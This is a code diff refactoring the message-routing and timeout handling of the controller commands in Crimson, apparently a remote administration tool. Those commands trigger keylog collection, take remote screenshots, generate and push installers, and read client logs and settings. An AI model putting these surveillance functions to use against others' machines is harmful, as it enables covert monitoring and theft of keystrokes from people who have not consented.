@@ -28,9 +28,10 @@ import java.util.List;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.core.net.MessageFuture.Timeout;
-import com.subterranean_security.crimson.core.store.ConnectionStore;
+import com.subterranean_security.crimson.core.net.TimeoutConstants;
+import com.subterranean_security.crimson.core.net.MessageFuture.MessageTimeout;
 import com.subterranean_security.crimson.core.store.LcvidStore;
+import com.subterranean_security.crimson.core.store.NetworkStore;
 import com.subterranean_security.crimson.core.util.FileUtil;
 import com.subterranean_security.crimson.core.util.IDGen;
 import com.subterranean_security.crimson.proto.core.Generator.ClientConfig;
@@ -67,8 +68,8 @@ public final class ViewerCommands {
 		log.debug("Changing server state: {}", st.toString());
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = ConnectionStore.routeAndWait(
-					Message.newBuilder().setRqChangeServerState(RQ_ChangeServerState.newBuilder().setNewState(st)), 3);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRqChangeServerState(
+					RQ_ChangeServerState.newBuilder().setNewState(st)), TimeoutConstants.DEFAULT);
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timeout");
 			} else if (!m.getRsChangeServerState().getOutcome().getResult()) {
@@ -81,7 +82,7 @@ public final class ViewerCommands {
 			}
 		} catch (InterruptedException e) {
 			outcome.setResult(false).setComment("Interrupted");
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -92,8 +93,9 @@ public final class ViewerCommands {
 		log.debug("Changing client state: {}", st.toString());
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
-					.setRqChangeClientState(RQ_ChangeClientState.newBuilder().setNewState(st)), 3);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+					.setRqChangeClientState(RQ_ChangeClientState.newBuilder().setNewState(st)),
+					TimeoutConstants.DEFAULT);
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timeout");
 			} else {
@@ -101,7 +103,7 @@ public final class ViewerCommands {
 			}
 		} catch (InterruptedException e) {
 			outcome.setResult(false).setComment("Interrupted");
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -111,8 +113,8 @@ public final class ViewerCommands {
 	public static Outcome createAuthMethod(AuthMethod at) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = ConnectionStore.routeAndWait(
-					Message.newBuilder().setRqCreateAuthMethod(RQ_CreateAuthMethod.newBuilder().setAuthMethod(at)), 3);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRqCreateAuthMethod(
+					RQ_CreateAuthMethod.newBuilder().setAuthMethod(at)), TimeoutConstants.DEFAULT);
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timeout");
 			} else if (!m.getRsCreateAuthMethod().getOutcome().getResult()) {
@@ -124,7 +126,7 @@ public final class ViewerCommands {
 			}
 		} catch (InterruptedException e) {
 			outcome.setResult(false).setComment("Interrupted");
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -134,8 +136,9 @@ public final class ViewerCommands {
 	public static Outcome removeAuthMethod(int id) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = ConnectionStore.routeAndWait(
-					Message.newBuilder().setRqRemoveAuthMethod(RQ_RemoveAuthMethod.newBuilder().setId(id)), 3);
+			Message m = NetworkStore.route(
+					Message.newBuilder().setRqRemoveAuthMethod(RQ_RemoveAuthMethod.newBuilder().setId(id)),
+					TimeoutConstants.DEFAULT);
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timeout");
 			} else if (!m.getRsRemoveAuthMethod().getResult()) {
@@ -147,7 +150,7 @@ public final class ViewerCommands {
 			}
 		} catch (InterruptedException e) {
 			outcome.setResult(false).setComment("Interrupted");
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -159,10 +162,10 @@ public final class ViewerCommands {
 		int id = IDGen.msg();
 		RQ_Generate.Builder rq = RQ_Generate.newBuilder().setInternalConfig(config);
 
-		ConnectionStore.route(Message.newBuilder().setId(id).setRqGenerate(rq).build());
+		NetworkStore.route(Message.newBuilder().setId(id).setRqGenerate(rq).build());
 
 		try {
-			Message rs = ConnectionStore.waitForResponse(0, id, 20);
+			Message rs = NetworkStore.getResponse(0, id, TimeoutConstants.RQ_Generate);
 
 			// success
 			final GenReport gr = rs.getRsGenerate().getReport();
@@ -187,7 +190,7 @@ public final class ViewerCommands {
 		} catch (IOException e) {
 			log.error("Failed to write the installer");
 			e.printStackTrace();
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			MainFrame.main.np.addNote("error", "Generation Timed Out!");
 			log.error("Could not generate an installer. Check the network.");
 		}
@@ -197,10 +200,10 @@ public final class ViewerCommands {
 	public static void trigger_key_update(int cid, Date target) {
 		log.debug("Triggering keylog update");
 		try {
-			Message m = ConnectionStore.routeAndWait(
-					Message.newBuilder().setRqKeyUpdate(
+			Message m = NetworkStore.route(
+					Message.newBuilder().setId(IDGen.msg()).setRqKeyUpdate(
 							RQ_KeyUpdate.newBuilder().setCid(cid).setStartDate(target == null ? 0 : target.getTime())),
-					30);
+					TimeoutConstants.RQ_KeyUpdate);
 			if (m != null) {
 				log.debug("Update result: " + m.getRsKeyUpdate().getResult());
 			}
@@ -208,7 +211,7 @@ public final class ViewerCommands {
 		} catch (InterruptedException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -217,8 +220,8 @@ public final class ViewerCommands {
 	public static ClientConfig getClientConfig(int cid) {
 		log.debug("Retrieving client config");
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
-					.setRqGetClientConfig(RQ_GetClientConfig.newBuilder()), 3);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+					.setRqGetClientConfig(RQ_GetClientConfig.newBuilder()), TimeoutConstants.DEFAULT);
 			if (m != null) {
 				return m.getRsGetClientConfig().getConfig();
 			}
@@ -226,7 +229,7 @@ public final class ViewerCommands {
 		} catch (InterruptedException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -242,8 +245,10 @@ public final class ViewerCommands {
 			outcome.setResult(false).setComment("No updated needed");
 		} else {
 			try {
-				Message m = ConnectionStore.routeAndWait(Message.newBuilder()
-						.setRqGenerate(RQ_Generate.newBuilder().setSendToCid(cid).setInternalConfig(client)), 15);
+				Message m = NetworkStore.route(
+						Message.newBuilder().setId(IDGen.msg())
+								.setRqGenerate(RQ_Generate.newBuilder().setSendToCid(cid).setInternalConfig(client)),
+						TimeoutConstants.RQ_Generate);
 				if (m == null) {
 					outcome.setResult(false).setComment("No response");
 				} else {
@@ -255,7 +260,7 @@ public final class ViewerCommands {
 				}
 			} catch (InterruptedException e) {
 				outcome.setResult(false).setComment("Interrupted");
-			} catch (Timeout e) {
+			} catch (MessageTimeout e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
@@ -269,8 +274,8 @@ public final class ViewerCommands {
 	public static Outcome quickScreenshot(int cid) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
-					.setRqQuickScreenshot(RQ_QuickScreenshot.newBuilder()), 10);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+					.setRqQuickScreenshot(RQ_QuickScreenshot.newBuilder()), TimeoutConstants.DEFAULT);
 			File file = new File(
 					System.getProperty("user.home") + "/Crimson/" + screenshotDate.format(new Date()) + ".jpg");
 			file.getParentFile().mkdirs();
@@ -287,7 +292,7 @@ public final class ViewerCommands {
 			outcome.setResult(false).setComment("Error: Interrupted");
 		} catch (IOException e) {
 			outcome.setResult(false).setComment("Error: " + e.getMessage());
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -296,8 +301,8 @@ public final class ViewerCommands {
 
 	public static LogFile getLog(int cid, LogType type) {
 		try {
-			Message m = ConnectionStore.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid)
-					.setRqLogs(RQ_Logs.newBuilder().setLog(type)), 3);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+					.setRqLogs(RQ_Logs.newBuilder().setLog(type)), TimeoutConstants.DEFAULT);
 
 			if (m != null) {
 				return m.getRsLogs().getLog(0);
@@ -305,7 +310,7 @@ public final class ViewerCommands {
 			}
 
 		} catch (InterruptedException e) {
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -314,8 +319,8 @@ public final class ViewerCommands {
 
 	public static List<LogFile> getLogs(int cid) {
 		try {
-			Message m = ConnectionStore.routeAndWait(
-					Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid).setRqLogs(RQ_Logs.newBuilder()), 3);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+					.setRqLogs(RQ_Logs.newBuilder()), TimeoutConstants.DEFAULT);
 
 			if (m != null) {
 				return m.getRsLogs().getLogList();
@@ -323,7 +328,7 @@ public final class ViewerCommands {
 			}
 
 		} catch (InterruptedException e) {
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -333,8 +338,9 @@ public final class ViewerCommands {
 	public static Outcome changeSetting(int cid, RQ_ChangeSetting rq) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = ConnectionStore
-					.routeAndWait(Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid).setRqChangeSetting(rq), 5);
+			Message m = NetworkStore.route(
+					Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid).setRqChangeSetting(rq),
+					TimeoutConstants.DEFAULT);
 
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timed out");
@@ -356,7 +362,7 @@ public final class ViewerCommands {
 
 		} catch (InterruptedException e) {
 			outcome.setResult(false).setComment("Interrupted");
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
@@ -366,8 +372,8 @@ public final class ViewerCommands {
 	public static Outcome openChat(int cid, boolean prompt) {
 		Outcome.Builder outcome = Outcome.newBuilder();
 		try {
-			Message m = ConnectionStore.routeAndWait(
-					Message.newBuilder().setRid(cid).setSid(LcvidStore.cvid).setRqChat(RQ_Chat.newBuilder()), 5);
+			Message m = NetworkStore.route(Message.newBuilder().setId(IDGen.msg()).setRid(cid).setSid(LcvidStore.cvid)
+					.setRqChat(RQ_Chat.newBuilder()), TimeoutConstants.DEFAULT);
 
 			if (m == null) {
 				outcome.setResult(false).setComment("Request timed out");
@@ -378,7 +384,7 @@ public final class ViewerCommands {
 
 		} catch (InterruptedException e) {
 			outcome.setResult(false).setComment("Interrupted");
-		} catch (Timeout e) {
+		} catch (MessageTimeout e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
